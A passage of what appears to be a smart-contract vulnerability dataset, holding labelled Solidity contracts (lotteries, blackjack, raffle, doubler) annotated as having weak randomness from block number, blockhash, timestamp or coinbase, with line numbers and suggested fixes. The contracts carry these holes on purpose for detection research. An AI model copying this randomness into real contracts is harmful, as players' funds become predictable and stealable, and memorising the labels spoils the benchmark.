GameState.Ongoing,\n\t\t\tcardsDealt: 3\n\t\t});\n\n\t\tcheckGameResult(games[msg.sender], false);\n\t}\n\n\t// deals one more card to the player\n\tfunction hit() public gameIsGoingOn {\n\t\tuint8 nextCard = games[msg.sender].cardsDealt;\n\t\tgames[msg.sender].playerCards.push(Deck.deal(msg.sender, nextCard));\n\t\tgames[msg.sender].cardsDealt = nextCard + 1;\n\t\tDeal(true, games[msg.sender].playerCards[games[msg.sender].playerCards.length - 1]);\n\t\tcheckGameResult(games[msg.sender], false);\n\t}\n\n\t// finishes the game\n\tfunction stand() public gameIsGoingOn {\n\n\t\tvar (houseScore, houseScoreBig) = calculateScore(games[msg.sender].houseCards);\n\n\t\twhile (houseScoreBig < 17) {\n\t\t\tuint8 nextCard = games[msg.sender].cardsDealt;\n\t\t\tuint8 newCard = Deck.deal(msg.sender, nextCard);\n\t\t\tgames[msg.sender].houseCards.push(newCard);\n\t\t\tgames[msg.sender].cardsDealt = nextCard + 1;\n\t\t\thouseScoreBig += Deck.valueOf(newCard, true);\n\t\t\tDeal(false, newCard);\n\t\t}\n\n\t\tcheckGameResult(games[msg.sender], true);\n\t}\n\n\t// @param finishGame - whether to finish the game or not (in case of Blackjack the game finishes anyway)\n\tfunction checkGameResult(Game game, bool finishGame) private {\n\t\t// calculate house score\n\t\tvar (houseScore, houseScoreBig) = calculateScore(game.houseCards);\n\t\t// calculate player score\n\t\tvar (playerScore, playerScoreBig) = calculateScore(game.playerCards);\n\n\t\tGameStatus(houseScore, houseScoreBig, playerScore, playerScoreBig);\n\n\t\tif (houseScoreBig == BLACKJACK || houseScore == BLACKJACK) {\n\t\t\tif (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) {\n\t\t\t\t// TIE\n\t\t\t\tif (!msg.sender.send(game.bet)) throw; // return bet to the player\n\t\t\t\tgames[msg.sender].state = GameState.Tie; // finish the game\n\t\t\t\treturn;\n\t\t\t} else {\n\t\t\t\t// HOUSE WON\n\t\t\t\tgames[msg.sender].state = GameState.House; // simply finish the game\n\t\t\t\treturn;\n\t\t\t}\n\t\t} else {\n\t\t\tif (playerScore == BLACKJACK || playerScoreBig == BLACKJACK) {\n\t\t\t\t// PLAYER WON\n\t\t\t\tif (game.playerCards.length == 2 && (Deck.isTen(game.playerCards[0]) || Deck.isTen(game.playerCards[1]))) {\n\t\t\t\t\t// Natural blackjack => return x2.5\n\t\t\t\t\tif (!msg.sender.send((game.bet * 5) / 2)) throw; // send prize to the player\n\t\t\t\t} else {\n\t\t\t\t\t// Usual blackjack => return x2\n\t\t\t\t\tif (!msg.sender.send(game.bet * 2)) throw; // send prize to the player\n\t\t\t\t}\n\t\t\t\tgames[msg.sender].state = GameState.Player; // finish the game\n\t\t\t\treturn;\n\t\t\t} else {\n\n\t\t\t\tif (playerScore > BLACKJACK) {\n\t\t\t\t\t// BUST, HOUSE WON\n\t\t\t\t\tLog(1);\n\t\t\t\t\tgames[msg.sender].state = GameState.House; // finish the game\n\t\t\t\t\treturn;\n\t\t\t\t}\n\n\t\t\t\tif (!finishGame) {\n\t\t\t\t\treturn; // continue the game\n\t\t\t\t}\n\n                // \u043d\u0435\u0434\u043e\u0431\u043e\u0440\n\t\t\t\tuint8 playerShortage = 0;\n\t\t\t\tuint8 houseShortage = 0;\n\n\t\t\t\t// player decided to finish the game\n\t\t\t\tif (playerScoreBig > BLACKJACK) {\n\t\t\t\t\tif (playerScore > BLACKJACK) {\n\t\t\t\t\t\t// HOUSE WON\n\t\t\t\t\t\tgames[msg.sender].state = GameState.House; // simply finish the game\n\t\t\t\t\t\treturn;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tplayerShortage = BLACKJACK - playerScore;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tplayerShortage = BLACKJACK - playerScoreBig;\n\t\t\t\t}\n\n\t\t\t\tif (houseScoreBig > BLACKJACK) {\n\t\t\t\t\tif (houseScore > BLACKJACK) {\n\t\t\t\t\t\t// PLAYER WON\n\t\t\t\t\t\tif (!msg.sender.send(game.bet * 2)) throw; // send prize to the player\n\t\t\t\t\t\tgames[msg.sender].state = GameState.Player;\n\t\t\t\t\t\treturn;\n\t\t\t\t\t} else {\n\t\t\t\t\t\thouseShortage = BLACKJACK - houseScore;\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\thouseShortage = BLACKJACK - houseScoreBig;\n\t\t\t\t}\n\n                // ?????????????????????? \u043f\u043e\u0447\u0435\u043c\u0443 \u0438\u0433\u0440\u0430 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f?\n\t\t\t\tif (houseShortage == playerShortage) {\n\t\t\t\t\t// TIE\n\t\t\t\t\tif (!msg.sender.send(game.bet)) throw; // return bet to the player\n\t\t\t\t\tgames[msg.sender].state = GameState.Tie;\n\t\t\t\t} else if (houseShortage > playerShortage) {\n\t\t\t\t\t// PLAYER WON\n\t\t\t\t\tif (!msg.sender.send(game.bet * 2)) throw; // send prize to the player\n\t\t\t\t\tgames[msg.sender].state = GameState.Player;\n\t\t\t\t} else {\n\t\t\t\t\tgames[msg.sender].state = GameState.House;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tfunction calculateScore(uint8[] cards) private constant returns (uint8, uint8) {\n\t\tuint8 score = 0;\n\t\tuint8 scoreBig = 0; // in case of Ace there could be 2 different scores\n\t\tbool bigAceUsed = false;\n\t\tfor (uint i = 0; i < cards.length; ++i) {\n\t\t\tuint8 card = cards[i];\n\t\t\tif (Deck.isAce(card) && !bigAceUsed) { // doesn't make sense to use the second Ace as 11, because it leads to the losing\n\t\t\t\tscoreBig += Deck.valueOf(card, true);\n\t\t\t\tbigAceUsed = true;\n\t\t\t} else {\n\t\t\t\tscoreBig += Deck.valueOf(card, false);\n\t\t\t}\n\t\t\tscore += Deck.valueOf(card, false);\n\t\t}\n\t\treturn (score, scoreBig);\n\t}\n\n\tfunction getPlayerCard(uint8 id) public gameIsGoingOn constant returns(uint8) {\n\t\tif (id < 0 || id > games[msg.sender].playerCards.length) {\n\t\t\tthrow;\n\t\t}\n\t\treturn games[msg.sender].playerCards[id];\n\t}\n\n\tfunction getHouseCard(uint8 id) public gameIsGoingOn constant returns(uint8) {\n\t\tif (id < 0 || id > games[msg.sender].houseCards.length) {\n\t\t\tthrow;\n\t\t}\n\t\treturn games[msg.sender].houseCards[id];\n\t}\n\n\tfunction getPlayerCardsNumber() public gameIsGoingOn constant returns(uint) {\n\t\treturn games[msg.sender].playerCards.length;\n\t}\n\n\tfunction getHouseCardsNumber() public gameIsGoingOn constant returns(uint) {\n\t\treturn games[msg.sender].houseCards.length;\n\t}\n\n\tfunction getGameState() public constant returns (uint8) {\n\t\tif (games[msg.sender].player == 0) {\n\t\t\tthrow; // game doesn't exist\n\t\t}\n\n\t\tGame game = games[msg.sender];\n\n\t\tif (game.state == GameState.Player) {\n\t\t\treturn 1;\n\t\t}\n\t\tif (game.state == GameState.House) {\n\t\t\treturn 2;\n\t\t}\n\t\tif (game.state == GameState.Tie) {\n\t\t\treturn 3;\n\t\t}\n\n\t\treturn 0; // the game is still going on\n\t}\n\n}\n",
    "vulnerable_function": "deal",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "weak_randomness",
    "original_category": "bad_randomness",
    "severity": "medium",
    "difficulty_tier": 4,
    "description": "Weak randomness - predictable random number generation at line(s) 17",
    "fix_description": "Use Chainlink VRF or commit-reveal scheme for randomness",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/bad_randomness/blackjack.sol",
    "pragma": "0.4.9",
    "source_url": "https://etherscan.io/address/0xa65d59708838581520511d98fb8b5d1f76a96cad#code"
  },
  {
    "id": "smartbugs_bad_randomness_etheraffle",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "etheraffle.sol",
    "file_content": "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xcC88937F325d1C6B97da0AFDbb4cA542EFA70870#code\n * @vulnerable_at_lines: 49,99,101,103,114,158\n * @author: -\n */\n\n pragma solidity ^0.4.16;\n\ncontract Ethraffle_v4b {\n    struct Contestant {\n        address addr;\n        uint raffleId;\n    }\n\n    event RaffleResult(\n        uint raffleId,\n        uint winningNumber,\n        address winningAddress,\n        address seed1,\n        address seed2,\n        uint seed3,\n        bytes32 randHash\n    );\n\n    event TicketPurchase(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    event TicketRefund(\n        uint raffleId,\n        address contestant,\n        uint number\n    );\n\n    // Constants\n    uint public constant prize = 2.5 ether;\n    uint public constant fee = 0.03 ether;\n    uint public constant totalTickets = 50;\n    uint public constant pricePerTicket = (prize + fee) / totalTickets; // Make sure this divides evenly\n    address feeAddress;\n\n    // Other internal variables\n    bool public paused = false;\n    uint public raffleId = 1;\n    // <yes> <report> BAD_RANDOMNESS\n    uint public blockNumber = block.number;\n    uint nextTicket = 0;\n    mapping (uint => Contestant) contestants;\n    uint[] gaps;\n\n    // Initialization\n    function Ethraffle_v4b() public {\n        feeAddress = msg.sender;\n    }\n\n    // Call buyTickets() when receiving Ether outside a function\n    function () payable public {\n        buyTickets();\n    }\n\n    function buyTickets() payable public {\n        if (paused) {\n            msg.sender.transfer(msg.value);\n            return;\n        }\n\n        uint moneySent = msg.value;\n\n        while (moneySent >= pricePerTicket && nextTicket < totalTickets) {\n            uint currTicket = 0;\n            if (gaps.length > 0) {\n                currTicket = gaps[gaps.length-1];\n                gaps.length--;\n            } else {\n                currTicket = nextTicket++;\n            }\n\n            contestants[currTicket] = Contestant(msg.sender, raffleId);\n            TicketPurchase(raffleId, msg.sender, currTicket);\n            moneySent -= pricePerTicket;\n        }\n\n        // Choose winner if we sold all the tickets\n        if (nextTicket == totalTickets) {\n            chooseWinner();\n        }\n\n        // Send back leftover money\n        if (moneySent > 0) {\n            msg.sender.transfer(moneySent);\n        }\n    }\n\n    function chooseWinner() private {\n        // <yes> <report> BAD_RANDOMNESS\n        address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;\n        // <yes> <report> BAD_RANDOMNESS\n        address seed2 = contestants[uint(msg.sender) % totalTickets].addr;\n        // <yes> <report> BAD_RANDOMNESS\n        uint seed3 = block.difficulty;\n        bytes32 randHash = keccak256(seed1, seed2, seed3);\n\n        uint winningNumber = uint(randHash) % totalTickets;\n        address winningAddress = contestants[winningNumber].addr;\n        RaffleResult(raffleId, winningNumber, winningAddress, seed1, seed2, seed3, randHash);\n\n        // Start next raffle\n        raffleId++;\n        nextTicket = 0;\n        // <yes> <report> BAD_RANDOMNESS\n        blockNumber = block.number;\n\n        // gaps.length = 0 isn't necessary here,\n        // because buyTickets() eventually clears\n        // the gaps array in the loop itself.\n\n        // Distribute prize and fee\n        winningAddress.transfer(prize);\n        feeAddress.transfer(fee);\n    }\n\n    // Get your money back before the raffle occurs\n    function getRefund() public {\n        uint refund = 0;\n        for (uint i = 0; i < totalTickets; i++) {\n            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {\n                refund += pricePerTicket;\n                contestants[i] = Contestant(address(0), 0);\n                gaps.push(i);\n                TicketRefund(raffleId, msg.sender, i);\n            }\n        }\n\n        if (refund > 0) {\n            msg.sender.transfer(refund);\n        }\n    }\n\n    // Refund everyone's money, start a new raffle, then pause it\n    function endRaffle() public {\n        if (msg.sender == feeAddress) {\n            paused = true;\n\n            for (uint i = 0; i < totalTickets; i++) {\n                if (raffleId == contestants[i].raffleId) {\n                    TicketRefund(raffleId, contestants[i].addr, i);\n                    contestants[i].addr.transfer(pricePerTicket);\n                }\n            }\n\n            RaffleResult(raffleId, totalTickets, address(0), address(0), address(0), 0, 0);\n            raffleId++;\n            nextTicket = 0;\n            // <yes> <report> BAD_RANDOMNESS\n            blockNumber = block.number;\n            gaps.length = 0;\n        }\n    }\n\n    function togglePause() public {\n        if (msg.sender == feeAddress) {\n            paused = !paused;\n        }\n    }\n\n    function kill() public {\n        if (msg.sender == feeAddress) {\n            selfdestruct(feeAddress);\n        }\n    }\n}\n",
    "vulnerable_function": "unknown",
    "vulnerable_lines": [
      49
    ],
    "vulnerability_type": "weak_randomness",
    "original_category": "bad_randomness",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Weak randomness - predictable random number generation at line(s) 49",
    "fix_description": "Use Chainlink VRF or commit-reveal scheme for randomness",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/bad_randomness/etheraffle.sol",
    "pragma": "0.4.16",
    "source_url": "https://etherscan.io/address/0xcC88937F325d1C6B97da0AFDbb4cA542EFA70870#code"
  },
  {
    "id": "smartbugs_bad_randomness_guess_the_random_number",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "guess_the_random_number.sol",
    "file_content": "/*\n * @source: https://capturetheether.com/challenges/lotteries/guess-the-random-number/\n * @author: Steve Marx\n * @vulnerable_at_lines: 15\n */\n\npragma solidity ^0.4.21;\n\ncontract GuessTheRandomNumberChallenge {\n    uint8 answer;\n\n    function GuessTheRandomNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n        // <yes> <report> BAD_RANDOMNESS\n        answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\n        if (n == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n",
    "vulnerable_function": "GuessTheRandomNumberChallenge",
    "vulnerable_lines": [
      15
    ],
    "vulnerability_type": "weak_randomness",
    "original_category": "bad_randomness",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Weak randomness - predictable random number generation at line(s) 15",
    "fix_description": "Use Chainlink VRF or commit-reveal scheme for randomness",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/bad_randomness/guess_the_random_number.sol",
    "pragma": "0.4.21",
    "source_url": "https://capturetheether.com/challenges/lotteries/guess-the-random-number/"
  },
  {
    "id": "smartbugs_bad_randomness_lottery",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "lottery.sol",
    "file_content": "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0x80ddae5251047d6ceb29765f38fed1c0013004b7#code\n * @vulnerable_at_lines: 38,42\n * @author: -\n */\n\n //added pragma version\n  pragma solidity ^0.4.0;\n  \n contract Lottery {\n     event GetBet(uint betAmount, uint blockNumber, bool won);\n\n     struct Bet {\n         uint betAmount;\n         uint blockNumber;\n         bool won;\n     }\n\n     address private organizer;\n     Bet[] private bets;\n\n     // Create a new lottery with numOfBets supported bets.\n     function Lottery() {\n         organizer = msg.sender;\n     }\n\n     // Fallback function returns ether\n     function() {\n         throw;\n     }\n\n     // Make a bet\n     function makeBet() {\n         // Won if block number is even\n         // (note: this is a terrible source of randomness, please don't use this with real money)\n         // <yes> <report> BAD_RANDOMNESS\n         bool won = (block.number % 2) == 0;\n\n         // Record the bet with an event\n         // <yes> <report> BAD_RANDOMNESS\n         bets.push(Bet(msg.value, block.number, won));\n\n         // Payout if the user won, otherwise take their money\n         if(won) {\n             if(!msg.sender.send(msg.value)) {\n                 // Return ether to sender\n                 throw;\n             }\n         }\n     }\n\n     // Get all bets that have been made\n     function getBets() {\n         if(msg.sender != organizer) { throw; }\n\n         for (uint i = 0; i < bets.length; i++) {\n             GetBet(bets[i].betAmount, bets[i].blockNumber, bets[i].won);\n         }\n     }\n\n     // Suicide :(\n     function destroy() {\n         if(msg.sender != organizer) { throw; }\n\n         suicide(organizer);\n     }\n }\n",
    "vulnerable_function": "makeBet",
    "vulnerable_lines": [
      38
    ],
    "vulnerability_type": "weak_randomness",
    "original_category": "bad_randomness",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Weak randomness - predictable random number generation at line(s) 38",
    "fix_description": "Use Chainlink VRF or commit-reveal scheme for randomness",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/bad_randomness/lottery.sol",
    "pragma": "0.4.0",
    "source_url": "https://etherscan.io/address/0x80ddae5251047d6ceb29765f38fed1c0013004b7#code"
  },
  {
    "id": "smartbugs_bad_randomness_lucky_doubler",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "lucky_doubler.sol",
    "file_content": "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8#code\n * @vulnerable_at_lines: 127,128,129,130,132\n * @author: -\n */\n\n //added pragma version\npragma solidity ^0.4.0;\n\n contract LuckyDoubler {\n//##########################################################\n//#### LuckyDoubler: A doubler with random payout order ####\n//#### Deposit 1 ETHER to participate                   ####\n//##########################################################\n//COPYRIGHT 2016 KATATSUKI ALL RIGHTS RESERVED\n//No part of this source code may be reproduced, distributed,\n//modified or transmitted in any form or by any means without\n//the prior written permission of the creator.\n\n    address private owner;\n\n    //Stored variables\n    uint private balance = 0;\n    uint private fee = 5;\n    uint private multiplier = 125;\n\n    mapping (address => User) private users;\n    Entry[] private entries;\n    uint[] private unpaidEntries;\n\n    //Set owner on contract creation\n    function LuckyDoubler() {\n        owner = msg.sender;\n    }\n\n    modifier onlyowner { if (msg.sender == owner) _; }\n\n    struct User {\n        address id;\n        uint deposits;\n        uint payoutsReceived;\n    }\n\n    struct Entry {\n        address entryAddress;\n        uint deposit;\n        uint payout;\n        bool paid;\n    }\n\n    //Fallback function\n    function() {\n        init();\n    }\n\n    function init() private{\n\n        if (msg.value < 1 ether) {\n             msg.sender.send(msg.value);\n            return;\n        }\n\n        join();\n    }\n\n    function join() private {\n\n        //Limit deposits to 1ETH\n        uint dValue = 1 ether;\n\n        if (msg.value > 1 ether) {\n\n        \tmsg.sender.send(msg.value - 1 ether);\n        \tdValue = 1 ether;\n        }\n\n        //Add new users to the users array\n        if (users[msg.sender].id == address(0))\n        {\n            users[msg.sender].id = msg.sender;\n            users[msg.sender].deposits = 0;\n            users[msg.sender].payoutsReceived = 0;\n        }\n\n        //Add new entry to the entries array\n        entries.push(Entry(msg.sender, dValue, (dValue * (multiplier) / 100), false));\n        users[msg.sender].deposits++;\n        unpaidEntries.push(entries.length -1);\n\n        //Collect fees and update contract balance\n        balance += (dValue * (100 - fee)) / 100;\n\n        uint index = unpaidEntries.length > 1 ? rand(unpaidEntries.length) : 0;\n        Entry theEntry = entries[unpaidEntries[index]];\n\n        //Pay pending entries if the new balance allows for it\n        if (balance > theEntry.payout) {\n\n            uint payout = theEntry.payout;\n\n            theEntry.entryAddress.send(payout);\n            theEntry.paid = true;\n            users[theEntry.entryAddress].payoutsReceived++;\n\n            balance -= payout;\n\n            if (index < unpaidEntries.length - 1)\n                unpaidEntries[index] = unpaidEntries[unpaidEntries.length - 1];\n\n            unpaidEntries.length--;\n\n        }\n\n        //Collect money from fees and possible leftovers from errors (actual balance untouched)\n        uint fees = this.balance - balance;\n        if (fees > 0)\n        {\n                owner.send(fees);\n        }\n\n    }\n\n    //Generate random number between 0 & max\n    uint256 constant private FACTOR =  1157920892373161954235709850086879078532699846656405640394575840079131296399;\n    // <yes> <report> BAD_RANDOMNESS\n    function rand(uint max) constant private returns (uint256 result){\n        uint256 factor = FACTOR * 100 / max;\n        uint256 lastBlockNumber = block.number - 1;\n        uint256 hashVal = uint256(block.blockhash(lastBlockNumber));\n\n        return uint256((uint256(hashVal) / factor)) % max;\n    }\n\n\n    //Contract management\n    function changeOwner(address newOwner) onlyowner {\n        owner = newOwner;\n    }\n\n    function changeMultiplier(uint multi) onlyowner {\n        if (multi < 110 || multi > 150) throw;\n\n        multiplier = multi;\n    }\n\n    function changeFee(uint newFee) onlyowner {\n        if (fee > 5)\n            throw;\n        fee = newFee;\n    }\n\n\n    //JSON functions\n    function multiplierFactor() constant returns (uint factor, string info) {\n        factor = multiplier;\n        info = 'The current multiplier applied to all deposits. Min 110%, max 150%.';\n    }\n\n    function currentFee() constant returns (uint feePercentage, string info) {\n        feePercentage = fee;\n        info = 'The fee percentage applied to all deposits. It can change to speed payouts (max 5%).';\n    }\n\n    function totalEntries() constant returns (uint count, string info) {\n        count = entries.length;\n        info = 'The number of deposits.';\n    }\n\n    function userStats(address user) constant returns (uint deposits, uint payouts, string info)\n    {\n        if (users[user].id != address(0x0))\n        {\n            deposits = users[user].deposits;\n            payouts = users[user].payoutsReceived;\n            info = 'Users stats: total deposits, payouts received.';\n        }\n    }\n\n    function entryDetails(uint index) constant returns (address user, uint payout, bool paid, string info)\n    {\n        if (index < entries.length) {\n            user = entries[index].entryAddress;\n            payout = entries[index].payout / 1 finney;\n            paid = entries[index].paid;\n            info = 'Entry info: user address, expected payout in Finneys, payout status.';\n        }\n    }\n\n\n}\n",
    "vulnerable_function": "rand",
    "vulnerable_lines": [
      127,
      128,
      129,
      130
    ],
    "vulnerability_type": "weak_randomness",
    "original_category": "bad_randomness",
    "severity": "medium",
    "difficulty_tier": 3,
    "description": "Weak randomness - predictable random number generation at line(s) 127, 128, 129, 130",
    "fix_description": "Use Chainlink VRF or commit-reveal scheme for randomness",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/bad_randomness/lucky_doubler.sol",
    "pragma": "0.4.0",
    "source_url": "https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8#code"
  },
  {
    "id": "smartbugs_bad_randomness_old_blockhash",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "old_blockhash.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/old_blockhash.sol\n * @author: -\n * @vulnerable_at_lines: 35\n */\n\npragma solidity ^0.4.24;\n\n//Based on the the Capture the Ether challange at https://capturetheether.com/challenges/lotteries/predict-the-block-hash/\n//Note that while it seems to have a 1/2^256 chance you guess the right hash, actually blockhash returns zero for blocks numbers that are more than 256 blocks ago so you can guess zero and wait.\ncontract PredictTheBlockHashChallenge {\n\n    struct guess{\n      uint block;\n      bytes32 guess;\n    }\n\n    mapping(address => guess) guesses;\n\n    constructor() public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function lockInGuess(bytes32 hash) public payable {\n        require(guesses[msg.sender].block == 0);\n        require(msg.value == 1 ether);\n\n        guesses[msg.sender].guess = hash;\n        guesses[msg.sender].block  = block.number + 1;\n    }\n\n    function settle() public {\n        require(block.number > guesses[msg.sender].block);\n        // <yes> <report> BAD_RANDOMNESS\n        bytes32 answer = blockhash(guesses[msg.sender].block);\n\n        guesses[msg.sender].block = 0;\n        if (guesses[msg.sender].guess == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n",
    "vulnerable_function": "settle",
    "vulnerable_lines": [
      35
    ],
    "vulnerability_type": "weak_randomness",
    "original_category": "bad_randomness",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Weak randomness - predictable random number generation at line(s) 35",
    "fix_description": "Use Chainlink VRF or commit-reveal scheme for randomness",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/bad_randomness/old_blockhash.sol",
    "pragma": "0.4.24",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/old_blockhash.sol"
  },
  {
    "id": "smartbugs_bad_randomness_random_number_generator",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "random_number_generator.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/random_number_generator.sol\n * @author: -\n * @vulnerable_at_lines: 12,18,20,22\n */\n\npragma solidity ^0.4.25;\n\n// Based on TheRun contract deployed at 0xcac337492149bDB66b088bf5914beDfBf78cCC18.\ncontract RandomNumberGenerator {\n  // <yes> <report> BAD_RANDOMNESS\n  uint256 private salt =  block.timestamp;\n\n  function random(uint max) view private returns (uint256 result) {\n    // Get the best seed for randomness\n    uint256 x = salt * 100 / max;\n    // <yes> <report> BAD_RANDOMNESS\n    uint256 y = salt * block.number / (salt % 5);\n    // <yes> <report> BAD_RANDOMNESS\n    uint256 seed = block.number / 3 + (salt % 300) + y;\n    // <yes> <report> BAD_RANDOMNESS\n    uint256 h = uint256(blockhash(seed));\n    // Random number between 1 and max\n    return uint256((h / x)) % max + 1;\n  }\n}\n",
    "vulnerable_function": "unknown",
    "vulnerable_lines": [
      12
    ],
    "vulnerability_type": "weak_randomness",
    "original_category": "bad_randomness",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Weak randomness - predictable random number generation at line(s) 12",
    "fix_description": "Use Chainlink VRF or commit-reveal scheme for randomness",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/bad_randomness/random_number_generator.sol",
    "pragma": "0.4.25",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/weak_randomness/random_number_generator.sol"
  },
  {
    "id": "smartbugs_bad_randomness_smart_billions",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "smart_billions.sol",
    "file_content": "/*\n * @source: https://etherscan.io/address/0x5ace17f87c7391e5792a7683069a8025b83bbd85#code\n * @author: -\n * @vulnerable_at_lines: 523,560,700,702,704,706,708,710,712,714,716,718\n */\n\npragma solidity ^0.4.13;\n\nlibrary SafeMath {\n  function sub(uint a, uint b) internal returns (uint) {\n    assert(b <= a);\n    return a - b;\n  }\n  function add(uint a, uint b) internal returns (uint) {\n    uint c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}\n\ncontract ERC20Basic {\n  uint public totalSupply;\n  address public owner; //owner\n  address public animator; //animator\n  function balanceOf(address who) constant returns (uint);\n  function transfer(address to, uint value);\n  event Transfer(address indexed from, address indexed to, uint value);\n  function commitDividend(address who) internal; // pays remaining dividend\n}\n\ncontract ERC20 is ERC20Basic {\n  function allowance(address owner, address spender) constant returns (uint);\n  function transferFrom(address from, address to, uint value);\n  function approve(address spender, uint value);\n  event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract BasicToken is ERC20Basic {\n  using SafeMath for uint;\n  mapping(address => uint) balances;\n\n  modifier onlyPayloadSize(uint size) {\n     assert(msg.data.length >= size + 4);\n     _;\n  }\n  /**\n  * @dev transfer token for a specified address\n  * @param _to The address to transfer to.\n  * @param _value The amount to be transferred.\n  */\n  function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) {\n    commitDividend(msg.sender);\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    if(_to == address(this)) {\n        commitDividend(owner);\n        balances[owner] = balances[owner].add(_value);\n        Transfer(msg.sender, owner, _value);\n    }\n    else {\n        commitDividend(_to);\n        balances[_to] = balances[_to].add(_value);\n        Transfer(msg.sender, _to, _value);\n    }\n  }\n  /**\n  * @dev Gets the balance of the specified address.\n  * @param _owner The address to query the the balance of.\n  * @return An uint representing the amount owned by the passed address.\n  */\n  function balanceOf(address _owner) constant returns (uint balance) {\n    return balances[_owner];\n  }\n}\n\ncontract StandardToken is BasicToken, ERC20 {\n  mapping (address => mapping (address => uint)) allowed;\n\n  /**\n   * @dev Transfer tokens from one address to another\n   * @param _from address The address which you want to send tokens from\n   * @param _to address The address which you want to transfer to\n   * @param _value uint the amout of tokens to be transfered\n   */\n  function transferFrom(address _from, address _to, uint _value) onlyPayloadSize(3 * 32) {\n    var _allowance = allowed[_from][msg.sender];\n    commitDividend(_from);\n    commitDividend(_to);\n    balances[_to] = balances[_to].add(_value);\n    balances[_from] = balances[_from].sub(_value);\n    allowed[_from][msg.sender] = _allowance.sub(_value);\n    Transfer(_from, _to, _value);\n  }\n  /**\n   * @dev Aprove the passed address to spend the specified amount of tokens on beahlf of msg.sender.\n   * @param _spender The address which will spend the funds.\n   * @param _value The amount of tokens to be spent.\n   */\n  function approve(address _spender, uint _value) {\n    //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n    assert(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\n    allowed[msg.sender][_spender] = _value;\n    Approval(msg.sender, _spender, _value);\n  }\n  /**\n   * @dev Function to check the amount of tokens than an owner allowed to a spender.\n   * @param _owner address The address which owns the funds.\n   * @param _spender address The address which will spend the funds.\n   * @return A uint specifing the amount of tokens still avaible for the spender.\n   */\n  function allowance(address _owner, address _spender) constant returns (uint remaining) {\n    return allowed[_owner][_spender];\n  }\n}\n\n/**\n * @title SmartBillions contract\n */\ncontract SmartBillions is StandardToken {\n\n    // metadata\n    string public constant name = \"SmartBillions Token\";\n    string public constant symbol = \"PLAY\";\n    uint public constant decimals = 0;\n\n    // contract state\n    struct Wallet {\n        uint208 balance; // current balance of user\n    \tuint16 lastDividendPeriod; // last processed dividend period of user's tokens\n    \tuint32 nextWithdrawBlock; // next withdrawal possible after this block number\n    }\n    mapping (address => Wallet) wallets;\n    struct Bet {\n        uint192 value; // bet size\n        uint32 betHash; // selected numbers\n        uint32 blockNum; // blocknumber when lottery runs\n    }\n    mapping (address => Bet) bets;\n\n    uint public walletBalance = 0; // sum of funds in wallets\n\n    // investment parameters\n    uint public investStart = 1; // investment start block, 0: closed, 1: preparation\n    uint public investBalance = 0; // funding from investors\n    uint public investBalanceMax = 200000 ether; // maximum funding\n    uint public dividendPeriod = 1;\n    uint[] public dividends; // dividens collected per period, growing array\n\n    // betting parameters\n    uint public maxWin = 0; // maximum prize won\n    uint public hashFirst = 0; // start time of building 